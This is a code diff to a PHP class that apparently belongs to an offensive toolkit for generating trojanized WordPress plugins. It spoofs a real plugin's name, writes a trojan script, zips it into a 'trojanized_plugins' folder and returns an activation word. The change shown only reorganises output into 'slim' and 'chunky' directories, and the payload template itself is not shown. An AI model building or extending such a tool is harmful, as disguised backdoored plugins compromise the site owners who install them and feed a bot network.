@@ -81,7 +81,7 @@ class makeMeWordPressing extends \ZipArchive
         }
         file_put_contents($spoof_name, implode("", $slop));
         return [
-            "TrojanPlugin" => $this->packZipArchive($spoof_name, $spoof['Plugin Name:']),
+            "TrojanPlugin" => $this->packZipArchive($spoof_name, $spoof['Plugin Name:'], "chonker"),
             "ActivationWord" => "Chonker-" . bin2hex(openssl_random_pseudo_bytes(10))
         ];
     }
@@ -123,20 +123,25 @@ TPL;
         $tr_name = "{$this->spoof_directory_name}/{$this->random_name}.php";
         file_put_contents("{$this->spoof_directory_name}/{$this->random_name}.php", $template);
         return [
-            "TrojanPlugin" => $this->packZipArchive($tr_name, $spoof['Plugin Name:']),
+            "TrojanPlugin" => $this->packZipArchive($tr_name, $spoof['Plugin Name:'], "slim"),
             "ActivationWord" => $this->activator
         ];
     }
 
-    protected function packZipArchive(string $trojan_script, string $spoof_name): string {
+    protected function packZipArchive(string $trojan_script, string $spoof_name, string $type): string {
+
         $zipper = new \ZipArchive();
-        if ($zipper->open("lib/new_bots/wordpressPlugins/trojanized_plugins/{$spoof_name}.zip", \ZipArchive::CREATE) !== true){
+        $target_zip_directory = "lib/new_bots/wordpressPlugins/trojanized_plugins/slim/";
+        if (str_contains($type, "chonker") !== false){
+            $target_zip_directory = "lib/new_bots/wordpressPlugins/trojanized_plugins/chunky/";
+        }
+        if ($zipper->open("{$target_zip_directory}{$spoof_name}.zip", \ZipArchive::CREATE | \ZipArchive::OVERWRITE) !== true){
             throw new \Exception(PHP_EOL."\033[0;31m[ !! ] PANIC, I CANNOT WRITE THE ZIP ARCHIVE. [ !! ]\033[0m".PHP_EOL);
         }
         $zipper->addFile("{$this->spoof_directory_name}/{$this->random_name}.php");
         $zipper->close();
         unlink($trojan_script);
         rmdir($this->spoof_directory_name);
-        return "lib/new_bots/wordpressPlugins/trojanized_plugins/{$spoof_name}.zip";
+        return "{$target_zip_directory}{$spoof_name}.zip";
     }
 }
